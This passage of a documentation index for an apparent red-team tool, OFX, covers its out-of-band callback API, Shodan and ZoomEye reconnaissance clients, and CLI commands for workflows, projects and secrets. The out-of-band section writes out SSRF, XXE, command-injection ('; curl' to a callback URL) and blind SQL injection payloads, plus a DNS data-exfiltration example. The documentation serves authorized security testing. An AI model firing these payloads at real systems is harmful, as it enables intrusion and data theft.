types</p>"},{"location":"api/reconnaissance/oob/#use-cases","title":"Use Cases","text":""},{"location":"api/reconnaissance/oob/#ssrf-detection","title":"SSRF Detection","text":"<pre><code>from ofx.api.oob import Interactsh\n\nclient = Interactsh()\noob_url = client.get_url()\n\n# Test SSRF\nimport requests\nrequests.post(\n    \"http://target.com/api\",\n    json={\"url\": oob_url}\n)\n\n# Check for callback\ninteractions = client.poll()\nif interactions:\n    print(\"SSRF vulnerability confirmed!\")\n</code></pre>"},{"location":"api/reconnaissance/oob/#xxe-detection","title":"XXE Detection","text":"<pre><code>from ofx.api.oob import Ceye\n\nclient = Ceye(api_key=\"...\")\ndomain = f\"{client.get_identifier()}.ceye.io\"\n\n# XXE payload\nxxe_payload = f'''&lt;?xml version=\"1.0\"?&gt;\n&lt;!DOCTYPE foo [\n  &lt;!ENTITY xxe SYSTEM \"http://{domain}/xxe\"&gt;\n]&gt;\n&lt;data&gt;&amp;xxe;&lt;/data&gt;\n'''\n\n# Send payload\nrequests.post(\"http://target.com/upload\", data=xxe_payload)\n\n# Check interactions\nif client.check_http():\n    print(\"XXE vulnerability confirmed!\")\n</code></pre>"},{"location":"api/reconnaissance/oob/#command-injection","title":"Command Injection","text":"<pre><code>from ofx.api.oob import Interactsh\n\nclient = Interactsh()\noob_url = client.get_url()\n\n# Command injection payload\npayload = f\"; curl {oob_url} ;\"\n\n# Test endpoint\nrequests.get(f\"http://target.com/api?cmd={payload}\")\n\n# Verify execution\ninteractions = client.poll()\nif interactions:\n    print(\"Command injection confirmed!\")\n    print(f\"User-Agent: {interactions[0]['headers']['user-agent']}\")\n</code></pre>"},{"location":"api/reconnaissance/oob/#blind-sql-injection","title":"Blind SQL Injection","text":"<pre><code>from ofx.api.oob import Ceye\nimport time\n\nclient = Ceye(api_key=\"...\")\ndomain = f\"{client.get_identifier()}.ceye.io\"\n\n# DNS exfiltration payload (MySQL)\npayload = f\"' OR (SELECT LOAD_FILE('\\\\\\\\\\\\\\\\{domain}\\\\\\\\test')) --\"\n\n# Send payload\nrequests.get(f\"http://target.com/search?q={payload}\")\n\n# Wait for DNS query\ntime.sleep(2)\n\nif client.check_dns():\n    print(\"Blind SQL injection confirmed!\")\n</code></pre>"},{"location":"api/reconnaissance/oob/#platform-comparison","title":"Platform Comparison","text":"Feature Interactsh Ceye Open Source \u2705 Yes \u274c No Self-hosted \u2705 Yes \u274c No API Key Required \u274c No \u2705 Yes DNS Support \u2705 Yes \u2705 Yes HTTP Support \u2705 Yes \u2705 Yes HTTPS Support \u2705 Yes \u2705 Yes SMTP Support \u2705 Yes \u274c No FTP Support \u274c No \u2705 Yes Rate Limits Higher Lower (free tier)"},{"location":"api/reconnaissance/oob/#best-practices","title":"Best Practices","text":"<ol> <li>Use Unique Identifiers: Generate new URLs for each test</li> <li>Add Context: Include identifiers in payloads for tracking</li> <li>Poll Regularly: Check interactions periodically</li> <li>Cleanup: Close clients when done</li> <li>Handle Rate Limits: Respect platform limits</li> </ol>"},{"location":"api/reconnaissance/oob/#advanced-usage","title":"Advanced Usage","text":""},{"location":"api/reconnaissance/oob/#custom-interactsh-server","title":"Custom Interactsh Server","text":"<pre><code>from ofx. import Interactsh\n\n# Use custom server\nclient = Interactsh(server=\"https://your-server.com\")\nurl = client.get_url()\n</code></pre>"},{"location":"api/reconnaissance/oob/#interaction-filtering","title":"Interaction Filtering","text":"<pre><code>from ofx.api.oob import Interactsh\n\nclient = Interactsh()\nurl = client.get_url()\n\n# Send payloads...\n\n# Filter specific interaction types\ndns_interactions = [\n    i for i in client.poll()\n    if i['protocol'] == 'dns'\n]\n\nhttp_interactions = [\n    i for i in client.poll()\n    if i['protocol'] == 'http'\n]\n</code></pre>"},{"location":"api/reconnaissance/oob/#data-exfiltration","title":"Data Exfiltration","text":"<pre><code>from ofx.api.oob import Ceye\nimport base64\n\nclient = Ceye(api_key=\"...\")\ndomain = f\"{client.get_identifier()}.ceye.io\"\n\n# Exfiltrate data via DNS subdomain\ndata = \"sensitive_data\"\nencoded = base64.b64encode(data.encode()).decode()\nexfil_domain = f\"{encoded}.{domain}\"\n\n# Trigger DNS query with data\npayload = f\"nslookup { exfil_domain}\"\n\n# Retrieve data from interactions\ninteractions = client.check_dns()\nfor interaction in interactions:\n    subdomain = interaction['name'].split('.')[0]\n    exfiltrated = base64.b64decode(subdomain).decode()\n    print(f\"Exfiltrated: {exfiltrated}\")\n</code></pre>"},{"location":"api/reconnaissance/oob/#see-also","title":"See Also","text":"<ul> <li>Exploitation API</li> <li>HTTP API</li> </ul>"},{"location":"api/reconnaissance/shodan/","title":"Shodan API","text":"<p>Shodan (https://www.shodan.io) is a search engine for internet-connected devices. The OFX Shodan client automates authentication and asset searching for reconnaissance workflows.</p>"},{"location":"api/reconnaissance/shodan/#features","title":"Features","text":"<ul> <li>Automated credential management (config file or prompt)</li> <li>Search with Shodan dorks and retrieve results as URLs</li> <li>Supports pagination and custom resource types</li> <li>Integrates with OFX YAML workflows and Python scripts</li> </ul>"},{"location":"api/reconnaissance/shodan/#setup","title":"Setup","text":"<p>You need a Shodan account and API key. The client will prompt for these on first use, or you can provide them in a config file:</p> <p>Config file location: <code>~/.local/share/ofx/config.ini</code></p> <pre><code>[Shodan]\nUser = your@email.com\nToken = your_shodan_api_key\n</code></pre>"},{"location":"api/reconnaissance/shodan/#usage-in-python","title":"Usage in Python","text":"<pre><code>from ofx.api.search.shodan import Shodan\n\n# Initialize (will prompt for credentials if not found)\nshodan = Shodan()\n\n# Search for assets with a Shodan dork\nresults = shodan.search('product:\"nginx\" country:\"US\"', pages=2)\nfor url in results:\n        print(url)\n</code></pre> <p>Parameters: - <code>dork</code> (str): Shodan query string (e.g., <code>port:8080 product:\"nginx\"</code>) - <code>pages</code> (int): Number of result pages to fetch (default: 1) - <code>resource</code> (str): 'host' for IP:port, or 'domain' for hostnames (default: 'host')</p>"},{"location":"api/reconnaissance/shodan/#usage-in-ofx-yaml-workflow","title":"Usage in OFX YAML Workflow","text":"<p>You can use the Shodan API in a workflow step:</p> <pre><code>name: Shodan Recon Example\njobs:\n    shodan_search:\n        steps:\n            - name: Search Shodan\n                run: |\n                    from ofx.api.search.shodan import Shodan\n                    shodan = Shodan()\n                    results = shodan.search('product:\"nginx\" country:\"US\"', pages=1)\n                    for url in results:\n                            print(url)\n                script:\n                outputs:\n                    targets: \"{{ step.stdout_lines }}\"\n</code></pre>"},{"location":"api/reconnaissance/shodan/#example-queries","title":"Example Queries","text":"<ul> <li><code>product:\"nginx\" country:\"US\"</code> \u2014 Find nginx servers in the US</li> <li><code>port:443 product:\"Apache\"</code> \u2014 Apache servers on port 443</li> <li><code>os:\"Windows\" city:\"Beijing\"</code> \u2014 Windows hosts in Beijing</li> </ul>"},{"location":"api/reconnaissance/shodan/#tips","title":"Tips","text":"<ul> <li>Shodan dorks use a rich query language; see Shodan Docs for syntax</li> <li>Always respect Shodan's API rate limits and your account's search credits</li> <li>Results are returned as a set of URLs (e.g., <code>https://1.2.3.4:443</code>)</li> <li>IPv6 addresses are wrapped in brackets (e.g., <code>https://[2606:4700:4700::1111]:443</code>)</li> </ul>"},{"location":"api/reconnaissance/shodan/#error-handling","title":"Error Handling","text":"<ul> <li>If credentials are invalid, you will be prompted to re-enter them</li> <li>API errors and rate limits are logged to the console</li> </ul>"},{"location":"api/reconnaissance/shodan/#see-also","title":"See Also","text":"<ul> <li>FOFA API</li> <li>ZoomEye API</li> </ul>"},{"location":"api/reconnaissance/zoomeye/","title":"ZoomEye API","text":"<p>ZoomEye (https://www.zoomeye.org) is a search engine for internet-connected assets. The OFX ZoomEye client automates authentication and asset searching for reconnaissance workflows.</p>"},{"location":"api/reconnaissance/zoomeye/#features","title":"Features","text":"<ul> <li>Automated credential management (config file or prompt)</li> <li>Search with ZoomEye dorks and retrieve results as URLs</li> <li>Supports pagination and custom resource types</li> <li>Integrates with OFX YAML workflows and Python scripts</li> </ul>"},{"location":"api/reconnaissance/zoomeye/#setup","title":"Setup","text":"<p>You need a ZoomEye account and API key. The client will prompt for these on first use, or you can provide them in a config file:</p> <p>Config file location: <code>~/.local/share/ofx/config.ini</code></p> <pre><code>[ZoomEye]\nUser = your@email.com\nToken = your_zoomeye_api_key\n</code></pre>"},{"location":"api/reconnaissance/zoomeye/#usage-in-python","title":"Usage in Python","text":"<pre><code>from ofx.api.search.zoomeye import ZoomEye\n\n# Initialize (will prompt for credentials if not found)\nzoomeye = ZoomEye()\n\n# Search for assets with a ZoomEye dork\nresults = zoomeye.search('app:\"nginx\" &amp;&amp; country:\"US\"', pages=2)\nfor url in results:\n        print(url)\n</code></pre> <p>Parameters: - <code>dork</code> (str): ZoomEye query string (e.g., <code>port:8080 &amp;&amp; app:\"nginx\"</code>) - <code>pages</code> (int): Number of result pages to fetch (default: 1) - <code>resource</code> (str): 'host' for IP:port, or 'domain' for hostnames (default: 'host')</p>"},{"location":"api/reconnaissance/zoomeye/#usage-in-ofx-yaml-workflow","title":"Usage in OFX YAML Workflow","text":"<p>You can use the ZoomEye API in a workflow step:</p> <pre><code>name: ZoomEye Recon Example\njobs:\n    zoomeye_search:\n        steps:\n            - name: Search ZoomEye\n                run: |\n                    from ofx.api.search.zoomeye import ZoomEye\n                    zoomeye = ZoomEye()\n                    results = zoomeye.search('app:\"nginx\" &amp;&amp; country:\"US\"', pages=1)\n                    for url in results:\n                            print(url)\n                script:\n                outputs:\n                    targets: \"{{ step.stdout_lines }}\"\n</code></pre>"},{"location":"api/reconnaissance/zoomeye/#example-queries","title":"Example Queries","text":"<ul> <li><code>app:\"nginx\" &amp;&amp; country:\"US\"</code> \u2014 Find nginx servers in the US</li> <li><code>port:443 &amp;&amp; app:\"Apache\"</code> \u2014 Apache servers on port 443</li> <li><code>os:\"Windows\" &amp;&amp; city:\"Beijing\"</code> \u2014 Windows hosts in Beijing</li> </ul>"},{"location":"api/reconnaissance/zoomeye/#tips","title":"Tips","text":"<ul> <li>ZoomEye dorks use a rich query language; see ZoomEye Docs for syntax</li> <li>Always respect ZoomEye's API rate limits and your account's search credits</li> <li>Results are returned as a set of URLs (e.g., <code>https://1.2.3.4:443</code>)</li> <li>IPv6 addresses are wrapped in brackets (e.g., <code>https://[2606:4700:4700::1111]:443</code>)</li> </ul>"},{"location":"api/reconnaissance/zoomeye/#error-handling","title":"Error Handling","text":"<ul> <li>If credentials are invalid, you will be prompted to re-enter them</li> <li>API errors and rate limits are logged to the console</li> </ul>"},{"location":"api/reconnaissance/zoomeye/#see-also","title":"See Also","text":"<ul> <li>FOFA API</li> <li>Shodan API</li> </ul>"},{"location":"cli/commands/","title":"CLI Commands Reference","text":"<p>OFX provides a comprehensive command-line interface for workflow execution, project management, API exploration, and documentation.</p>"},{"location":"cli/commands/#quick-reference","title":"Quick Reference","text":"Command Subcommands Purpose flow (x, task) run, validate, update, tools Execute and manage workflows project init, sync, list, remove Manage Red Team projects secret set, get, list, search, delete, export, import, backup, restore, history, clear, store, migrate Manage encrypted secrets dump schema, flow Display workflow schemas and configurations docs serve, api Access documentation and API reference asset init Initialize OFX assets doctor check, install-help, path System health and diagnostics"},{"location":"cli/commands/#command-structure","title":"Command Structure","text":"<pre><code>ofx &lt;command&gt; &lt;subcommand&gt; [options] [arguments]\n</code></pre>"},{"location":"cli/commands/#global-options","title":"Global Options","text":"<p>All commands support these global options:</p> <ul> <li><code>--help, -h</code> - Show help message and command documentation</li> <li><code>--version</code> - Display OFX version information</li> </ul>"},{"location":"cli/commands/#flow-x-task","title":"flow / x / task","text":"<p>Manage and run workflows in the OFX system</p> <p>Aliases: <code>x</code>, <code>task</code> - You can use <code>ofx x run</code> or <code>ofx task run</code> instead of <code>ofx flow run</code></p>"},{"location":"cli/commands/#flow-run","title":"flow run","text":"<p>Execute a workflow with optional inputs and outputs.</p> <pre><code>ofx flow run &lt;workflow_name&gt; [options]\nofx x run &lt;workflow_name&gt; [options]          # Using alias\n</code></pre> <p>Arguments: - <code>workflow_name</code> (required) - Name of the workflow to run</p> <p>Options: - <code>-i, --input &lt;key=value&gt;</code> - Input parameters (can be specified multiple times) - <code>-o, --output &lt;path&gt;</code> - Output directory for results (default: current directory)</p> <p>Examples:</p> <pre><code># Run a simple workflow\nofx flow run port_scan\n\n# Run with inputs\nofx flow run subdomain_enum --input domain=example.com\n\n# Run with multiple inputs\nofx flow run api_scan \\\n  --input target=https://api.example.com \\\n  --input endpoints=/users,/admin,/api\n\n# Specify output directory\nofx flow run comprehensive_scan \\\n  --input target=10.0.0.1 \\\n  --output ./results/scan-2024-12-25\n</code></pre>"},{"location":"cli/commands/#flow-validate","title":"flow validate","text":"<p>Validate workflow configuration syntax and structure.</p> <pre><code>ofx flow validate &lt;workflow_name&gt;\n</code></pre> <p>Arguments: - <code>workflow_name</code> (required) - Name of the workflow to validate</p> <p>Examples:</p> <pre><code># Validate a workflow before running\nofx flow validate my_workflow\n\n# Check for errors in workflow definition\nofx flow validate complex_multi_stage_assessment\n</code></pre>"},{"location":"cli/commands/#flow-update","title":"flow update","text":"<p>Update workflow configuration and dependencies.</p> <pre><code>ofx flow update\n</code></pre> <p>Examples:</p> <pre><code># Update all workflows\nofx flow update\n</code></pre>"},{"location":"cli/commands/#flow-tools","title":"flow tools","text":"<p>Install tools configured in workflow(s).</p> <pre><code>ofx flow tools [workflow_name] [options]\n</code></pre> <p>Arguments: - <code>workflow_name</code> (optional) - Name of specific workflow to install tools from</p> <p>Options: - <code>-a, --all</code> - Install tools from all workflows</p> <p>Examples:</p> <pre><code># Install tools for specific workflow\nofx flow tools web_scanner\n\n# Install tools from all workflows\nofx flow tools --all\n</code></pre>"},{"location":"cli/commands/#project","title":"project","text":"<p>Manage Red Team projects</p> <p>Project management including initialization, synchronization, and remote storage.</p>"},{"location":"cli/commands/#project-init","title":"project init","text":"<p>Initialize a new Red Team project with optional remote storage and encryption.</p> <pre><code>ofx project init &lt;name&gt; [options]\n</code></pre> <p>Arguments: - <code>name</code> (required) - Project name</p> <p>Options: - <code>-m, --multiphase</code> - Initialize a multi-phase project</p> <p>Interactive Setup: The command will interactively prompt for: - Remote storage type (git, ssh, s3, webdav, none) - Repository/server details - Encryption options</p> <p>Examples:</p> <pre><code># Initialize simple project\nofx project init my_engagement\n\n# Initialize multi-phase project\nofx project init enterprise_assessment --multiphase\n\n# Project with Git remote\nofx project init client_pentest\n# Then follow prompts for Git URL and encryption\n</code></pre>"},{"location":"cli/commands/#project-sync","title":"project sync","text":"<p>Synchronize project with remote storage.</p> <pre><code>ofx project sync [options]\n</code></pre> <p>Options: - <code>--push</code> - Push local changes to remote - <code>--pull</code> - Pull remote changes to local - <code>--force</code> - Force sync operation</p> <p>Examples:</p> <pre><code># Sync with remote\nofx project sync\n\n# Force push changes\nofx project sync --push --force\n\n# Pull latest from remote\nofx project sync --pull\n</code></pre>"},{"location":"cli/commands/#project-list","title":"project list","text":"<p>List all available projects.</p> <pre><code>ofx project list\n</code></pre> <p>Description: Shows all projects in the default project path with their details and status.</p> <p>Output: - Project names - Creation dates - Current active project (marked)</p> <p>Examples:</p> <pre><code># List all projects\nofx project list\n</code></pre>"},{"location":"cli/commands/#project-remove","title":"project remove","text":"<p>Remove a project by name.</p> <pre><code>ofx project remove &lt;name&gt; [options]\n</code></pre> <p>Arguments: - <code>name</code> (required) - Project name to remove</p> <p>Options: - <code>-f, --force</code> - Skip confirmation prompt</p> <p>Description: Permanently deletes a project and all its data. Use with caution.</p> <p>Examples:</p> <pre><code># Remove project with confirmation\nofx project remove old_engagement\n\n# Remove without confirmation\nofx project remove test_project --force\n</code></pre>"},{"location":"cli/commands/#secret","title":"secret","text":"<p>Manage secrets for workflows</p> <p>Secure encrypted storage for API keys, tokens, and sensitive data.</p>"},{"location":"cli/commands/#secret-set","title":"secret set","text":"<p>Store a secret value in encrypted storage.</p> <pre><code>ofx secret set &lt;name&gt; [options]\n</code></pre> <p>Arguments: - <code>name</code> (required) - Secret name/identifier</p> <p>Options: - <code>-v, --value &lt;value&gt;</code> - Secret value (if not provided, will prompt securely) - <code>-f, --file &lt;path&gt;</code> - Read secret value from file</p> <p>Examples:</p> <pre><code># Set secret interactively (hidden input)\nofx secret set API_KEY\n\n# Set secret directly\nofx secret set DATABASE_URL --value \"postgresql://user:pass@host/db\"\n\n# Set secret from file\nofx secret set SSH_PRIVATE_KEY --file ~/.ssh/id_rsa\n\n# Set JSON secret\nofx secret set AWS_CREDENTIALS --value '{\"access_key\":\"xxx\",\"secret_key\":\"yyy\"}'\n</code></pre>"},{"location":"cli/commands/#secret-get","title":"secret get","text":"<p>Retrieve a secret value.</p> <pre><code>ofx secret get &lt;name&gt; [options]\n</code></pre> <p>Arguments: - <code>name</code> (required) - Secret name</p> <p>Options: - <code>-s, --show</code> - Display the secret value (otherwise just confirms existence)</p> <p>Examples:</p> <pre><code># Check if secret exists\nofx secret get API_KEY\n\n# Show secret value\nofx secret get API_KEY --show\n\n# Show JSON secret formatted\nofx secret get AWS_CREDENTIALS --show\n</code></pre>"},{"location":"cli/commands/#secret-list","title":"secret list","text":"<p>List all stored secrets with optional filtering and searching.</p> <pre><code>ofx secret list [options]\n</code></pre> <p>Options: - <code>-f, --filter &lt;type&gt;</code> - Filter by type (string, json, api-key, password, token) - <code>-s, --search &lt;pattern&gt;</code> - Search in secret names (case-insensitive) - <code>--show-values</code> - Show secret values (WARNING: displays sensitive data)</p> <p>Output: - Secret names - Value types (string, json, api-key, password, token)</p> <p>Examples:</p> <pre><code># List all secrets\nofx secret list\n\n# Filter by type\nofx secret list --filter json\nofx secret list --filter password\n\n# Search by name pattern\nofx secret list --search api\nofx secret list --search \"*token*\"\n\n# Show values (use with caution)\nofx secret list --show-values\n</code></pre>"},{"location":"cli/commands/#secret-search","title":"secret search","text":"<p>Search for secrets by name pattern with wildcard support.</p> <pre><code>ofx secret search &lt;pattern&gt; [options]\n</code></pre> <p>Arguments: - <code>pattern</code> (required) - Search pattern (supports wildcards: <code>*</code> and <code>?</code>)</p> <p>Options: - <code>--show-values</code> - Show secret values (WARNING: displays sensitive data)</p> <p>Description: Performs pattern matching on secret names using wildcards. <code>*</code> matches any sequence of characters, <code>?</code> matches any single character.</p> <p>Examples:</p> <pre><code># Search for all secrets containing \"api\"\nofx secret search \"*api*\"\n\n# Search for secrets starting with \"aws\"\nofx secret search \"aws*\"\n\n# Search for exact match\nofx secret search \"github_token\"\n\n# Show values for matching secrets\nofx secret search \"*key*\" --show-values\n</code></pre>"},{"location":"cli/commands/#secret-delete","title":"secret delete","text":"<p>Delete a secret from storage.</p> <pre><code>ofx secret delete &lt;name&gt; [options]\n</code></pre> <p>Arguments: - <code>name</code> (required) - Secret name to delete</p> <p>Options: - <code>-f, --force</code> - Skip confirmation prompt</p> <p>Examples:</p> <pre><code># Delete with confirmation\nofx secret delete OLD_API_KEY\n\n# Delete without confirmation\nofx secret delete TEMP_TOKEN --force\n</code></pre>"},{"location":"cli/commands/#secret-export","title":"secret export","text":"<p>Export secrets to a file for backup or migration.</p> <pre><code>ofx secret export [options]\n</code></pre> <p>Options: - <code>-o, --output &lt;path&gt;</code> - Output file path (default: secrets_backup.json) - <code>--plain</code> - Export without encryption (not recommended)</p> <p>Description: Creates an encrypted backup of all secrets. Keep the backup file secure.</p> <p>Examples:</p> <pre><code># Export to default file\nofx secret export\n\n# Export to specific file\nofx secret export --output /secure/backup.json\n</code></pre>"},{"location":"cli/commands/#secret-import","title":"secret import","text":"<p>Import secrets from a backup file.</p> <pre><code>ofx secret import &lt;file&gt; [options]\n</code></pre> <p>Arguments: - <code>file</code> (required) - Path to secrets backup file</p> <p>Options: - <code>--merge</code> - Merge with existing secrets (default: replace) - <code>-f, --force</code> - Skip confirmation for overwrites</p> <p>Description: Restores secrets from a backup file. By default, replaces all existing secrets.</p> <p>Examples:</p> <pre><code># Import and replace all secrets\nofx secret import secrets_backup.json\n\n# Import and merge with existing\nofx secret import secrets_backup.json --merge\n\n# Import without confirmation\nofx secret import secrets_backup.json --force\n</code></pre>"},{"location":"cli/commands/#secret-backup","title":"secret backup","text":"<p>Create an encrypted backup of all secrets with timestamp.</p> <pre><code>ofx secret backup [options]\n</code></pre> <p>Options: - <code>-o, --output &lt;path&gt;</code> - Output file path (default: auto-generated with timestamp) - <code>--plain</code> - Export without encryption (not recommended)</p> <p>Description: Creates a timestamped, encrypted backup of all secrets. The backup includes metadata like creation time and can be restored later. Backups are stored in the OFX secrets directory by default.</p> <p>Examples:</p> <pre><code># Create backup with auto-generated name\nofx secret backup\n\n# Create backup with custom name\nofx secret backup --output my_backup.json\n\n# Create unencrypted backup (not recommended)\nofx secret backup --plain --output plain_backup.json\n</code></pre>"},{"location":"cli/commands/#secret-restore","title":"secret restore","text":"<p>Restore secrets from a backup file with conflict resolution.</p> <pre><code>ofx secret restore &lt;file&gt; [options]\n</code></pre> <p>Arguments: - <code>file</code> (required) - Path to backup file</p> <p>Options: - <code>--strategy &lt;mode&gt;</code> - Conflict resolution strategy (skip, overwrite, rename) - <code>-f, --force</code> - Skip confirmation prompts</p> <p>Description: Restores secrets from a backup file. Supports different conflict resolution strategies when secrets already exist.</p> <p>Examples:</p> <pre><code># Restore with default strategy (overwrite)\nofx secret restore backup_20241227_143022.json\n\n# Skip existing secrets\nofx secret restore backup.json --strategy skip\n\n# Rename conflicting secrets\nofx secret restore backup.json --strategy rename\n\n# Force restore without confirmation\nofx secret restore backup.json --force\n</code></pre>"},{"location":"cli/commands/#secret-history","title":"secret history","text":"<p>View backup history and manage backup files.</p> <pre><code>ofx secret history [options]\n</code></pre> <p>Options: - <code>--clean</code> - Remove old backup files (keep last 10) - <code>--list</code> - Show detailed backup information</p> <p>Description: Displays information about existing backups, including creation time, size, and status. Can also clean up old backups.</p> <p>Examples:</p> <pre><code># Show backup history\nofx secret history\n\n# Show detailed backup info\nofx secret history --list\n\n# Clean old backups\nofx secret history --clean\n</code></pre>"},{"location":"cli/commands/#secret-clear","title":"secret clear","text":"<p>Clear all secrets from storage.</p> <pre><code>ofx secret clear [options]\n</code></pre> <p>Options: - <code>-f, --force</code> - Skip confirmation prompt</p> <p>Description: Removes ALL secrets from encrypted storage. This action cannot be undone.</p> <p>Examples:</p> <pre><code># Clear all secrets with confirmation\nofx secret clear\n\n# Clear without confirmation\nofx secret clear --force\n</code></pre>"},{"location":"cli/commands/#secret-store","title":"secret store","text":"<p>Display the path to the secret store file.</p> <pre><code>ofx secret store\n</code></pre> <p>Description: Shows the location of the encrypted secrets file for backup or inspection.</p> <p>Examples:</p> <pre><code># Show secret store location\nofx secret store\n</code></pre>"},{"location":"cli/commands/#secret-migrate","title":"secret migrate","text":"<p>Migrate secrets between different storage formats or locations.</p> <pre><code>ofx secret migrate [options]\n</code></pre> <p>Options: - <code>--from &lt;format&gt;</code> - Source format (v1, v2, plain) - <code>--to &lt;format&gt;</code> - Target format (v2, v3)</p> <p>Description: Upgrades secret storage format when OFX versions change.</p> <p>Examples:</p> <pre><code># Migrate to latest format\nofx secret migrate --from v1 --to v2\n</code></pre>"},{"location":"cli/commands/#dump","title":"dump","text":"<p>Dump workflow configuration and outputs</p> <p>Display workflow schema, properties, and data models for reference.</p>"},{"location":"cli/commands/#dump-schema","title":"dump schema","text":"<p>Display workflow schema information in formatted tables.</p> <pre><code>ofx dump schema [options]\n</code></pre> <p>Options: - <code>--workflow</code> - Show workflow-level properties only - <code>--job</code> - Show job-level properties only - <code>--step</code> - Show step-level properties only - <code>--json</code> - Output in JSON format</p> <p>Description: Displays the complete workflow data model including all properties, types, defaults, and descriptions for workflow, job, and step objects.</p> <p>Examples:</p> <pre><code># Dump complete schema (all levels)\nofx dump schema\n\n# Show only workflow properties\nofx dump schema --workflow\n\n# Show job properties\nofx dump schema --job\n\n# Export schema as JSON\nofx dump schema --json &gt; workflow_schema.json\n</code></pre>"},{"location":"cli/commands/#dump-flow","title":"dump flow","text":"<p>Dump a specific workflow's configuration.</p> <pre><code>ofx dump flow &lt;workflow_name&gt; [options]\n</code></pre> <p>Arguments: - <code>workflow_name</code> (required) - Name of the workflow to dump</p> <p>Options: - <code>--json</code> - Output in JSON format - <code>--yaml</code> - Output in YAML format (default)</p> <p>Description: Shows the complete configuration of a workflow including all jobs, steps, hooks, inputs, and secrets.</p> <p>Examples:</p> <pre><code># Dump workflow configuration\nofx dump flow port_scan\n\n# Dump as JSON\nofx dump flow port_scan --json\n\n# Save to file\nofx dump flow my_workflow --yaml &gt; workflow_backup.yml\n</code></pre>"},{"location":"cli/commands/#docs","title":"docs","text":"<p>Documentation server and API reference</p> <p>Access OFX documentation and explore API functions.</p>"},{"location":"cli/commands/#docs-serve","title":"docs serve","text":"<p>Serve documentation locally using HTTP server.</p> <pre><code>ofx docs serve [options]\n</code></pre> <p>Options: - <code>-h, --host &lt;address&gt;</code> - Host to bind to (default: 127.0.0.1) - <code>-p, --port &lt;number&gt;</code> - Port to bind to (default: 8000)</p> <p>Examples:</p> <pre><code># Serve on default port 8000\nofx docs serve\n\n# Serve on custom port\nofx docs serve --port 8080\n\n# Serve on all interfaces\nofx docs serve --host 0.0.0.0 --port 80\n</code></pre> <p>Access: Open http://127.0.0.1:8000 in your browser</p>"},{"location":"cli/commands/#docs-api","title":"docs api","text":"<p>Display OFX API documentation in terminal.</p> <pre><code>ofx docs api [options]\n</code></pre> <p>Options: - <code>-l, --list</code> - List all available API modules - <code>-m, --module &lt;name&gt;</code> - View specific module documentation - <code>-f, --function &lt;name&gt;</code> - View specific function/class details</p> <p>Examples:</p> <pre><code># List all API modules\nofx docs api --list\n\n# View module documentation\nofx docs api --module webshell\n\n# View specific function\nofx docs api --module http --function send_request\n\n# View class method\nofx docs api --module webshell --function WebShell.execute\n</code></pre> <p>Output Format: - Function signatures with type hints - Parameter tables (name, type, required, default) - Return types - Docstrings and examples - Model schemas for complex types</p>"},{"location":"cli/commands/#asset","title":"asset","text":"<p>Manage OFX assets</p> <p>Asset initialization and management.</p>"},{"location":"cli/commands/#asset-init","title":"asset init","text":"<p>Initialize new OFX assets.</p> <pre><code>ofx asset init\n</code></pre> <p>Interactive: Prompts for asset type and configuration.</p> <p>Examples:</p> <pre><code># Initialize asset\nofx asset init\n</code></pre>"},{"location":"cli/commands/#doctor","title":"doctor","text":"<p>Check system dependencies and required tools</p> <p>Verify installation and availability of essential and recommended tools.</p>"},{"location":"cli/commands/#doctor-check","title":"doctor check","text":"<p>Run comprehensive system health check.</p> <pre><code>ofx doctor check [options]\n</code></pre> <p>Options: - <code>--verbose</code> - Show detailed diagnostic information - <code>--json</code> - Output results in JSON format</p> <p>Description: Checks for all essential and recommended tools including: - Git, curl, Python 3.10+ - uv package manager - Go toolchain - Node.js runtime - Common security tools (nmap, masscan, nuclei, etc.)</p> <p>Examples:</p> <pre><code># Run basic health check\nofx doctor check\n\n# Run with detailed output\nofx doctor check --verbose\n\n# Export results as JSON\nofx doctor check --json &gt; system_status.json\n</code></pre> <p>Output: - \u2713 Green checks for installed tools with versions - \u2717 Red warnings for missing tools - Installation suggestions and links</p>"},{"location":"cli/commands/#doctor-install-help","title":"doctor install-help","text":"<p>Show installation instructions for tools.</p> <pre><code>ofx doctor install-help [tool_name]\n</code></pre> <p>Arguments: - <code>tool_name</code> (optional) - Specific tool to show help for</p> <p>Description: Displays detailed installation instructions for missing or specified tools.</p> <p>Examples:</p> <pre><code># Show help for all missing tools\nofx doctor install-help\n\n# Show help for specific tool\nofx doctor install-help nmap\nofx doctor install-help golang\n</code></pre> <p>Output: - Installation commands for current OS - Package manager recommendations - Download links and documentation</p>"},{"location":"cli/commands/#doctor-path","title":"doctor path","text":"<p>Show PATH environment variable directories.</p> <pre><code>ofx doctor path\n</code></pre> <p>Description: Displays all directories in your PATH environment variable to help diagnose tool discovery issues.</p> <p>Examples:</p> <pre><code># Show PATH directories\nofx doctor path\n</code></pre> <p>Output: - List of all PATH directories - Indicates which ones exist vs missing - Shows tool locations in each directory</p> <pre><code>ofx doctor [options]\n</code></pre> <p>Options: - <code>--fix</code> - Attempt to fix issues automatically - <code>--verbose</code> - Show detailed diagnostic information</p> <p>Examples:</p> <pre><code># Run health check\nofx doctor\n\n# Run with fix suggestions\nofx doctor --fix\n</code></pre> <p>Checks: - Git installation and version - curl availability - Python 3.10+ runtime - uv package manager - Go toolchain - Node.js runtime - Common security tools (nmap, masscan, nuclei, etc.)</p> <p>Output: - \u2713 Green checks for installed tools - \u2717 Red warnings for missing tools - Installation suggestions and links</p>"},{"location":"cli/commands/#common-workflows","title":"Common Workflows","text":""},{"location":"cli/commands/#initial-setup","title":"Initial Setup","text":"<pre><code># Check system dependencies\nofx doctor\n\n# Initialize a project\nofx project init my_first_project\n\n# Set up secrets\nofx secret set SHODAN_API_KEY\nofx secret set GITHUB_TOKEN\n\n# Validate workflow\nofx flow validate recon\n\n# Run workflow\nofx flow run recon --input target=example.com\n</code></pre>"},{"location":"cli/commands/#daily-operations","title":"Daily Operations","text":"<pre><code># Switch project\nofx project switch client_engagement\n\n# Pull latest workflows\nofx flow update\n\n# Install required tools\nofx flow tools --all\n\n# Run assessment\nofx x run comprehensive_scan \\\n  --input target=10.0.0.0/24 \\\n  --output ./results/$(date +%Y%m%d)\n\n# Check results\nls -lah ./results/$(date +%Y%m%d)/\n</code></pre>"},{"location":"cli/commands/#development-testing","title":"Development &amp; Testing","text":"<pre><code># Validate workflow changes\nofx flow validate custom_workflow\n\n# Check API documentation\nofx docs api --list\nofx docs api --module http\n\n# View local docs\nofx docs serve --port 8000\n\n# Dump schema for reference\nofx dump schema --workflow &gt; workflow_schema.txt\n</code></pre>"},{"location":"cli/commands/#secret-management","title":"Secret Management","text":"<pre><code># Set multiple secrets interactively\nofx secret set SHODAN_API_KEY\nofx 